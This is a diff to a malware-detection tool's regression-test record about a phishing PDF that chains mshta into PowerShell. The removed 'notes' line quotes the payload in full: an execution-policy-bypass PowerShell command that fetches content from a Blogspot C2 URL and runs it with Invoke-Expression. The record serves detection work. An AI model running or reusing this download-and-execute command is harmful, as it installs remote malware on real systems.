@@ -37,5 +37,5 @@
   "regression_test": "mshta_italian_sandbox_escape_detections_present",
   "first_seen": "2026-02-23",
   "analysis_date": "2026-02-28",
-  "notes": "Full mshta-to-PowerShell kill chain: PDF opens -> Italian-language JS alert (social engineering) -> OpenAction -> Launch(mshta) -> mshta executes javascript: URL -> ActiveXObject SHELLEXECUTE -> PowerShell -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-Expression(IrM https://hotelmay21.blogspot.com////phudi.pdf). C2 URL embedded in launch action /P parameter. Note: 'SecuriptyProtocol' typo in payload (likely intentional for detection evasion). Same Italian alert lure as booking-js-phishing (379b41e3) - same campaign. Chain gap: OpenAction->Launch->PowerShell->C2 not represented in a single end-to-end chain. C2 URL not extracted into a dedicated finding."
+  "notes": "Full mshta-to-PowerShell kill chain: PDF opens -> Italian-language JS alert -> OpenAction -> Launch(mshta) -> PowerShell cradle. Post-uplift validation (2026-02-28): `/Launch /Win` fields are parsed (`launch.win.f/p/d/o`) and `launch_win_embedded_url` now extracts the Blogspot C2 URL as a dedicated finding. Residual chain gap: social-engineering JS and renderer-evasion signals are still split across separate chains rather than one canonical end-to-end narrative."
 }
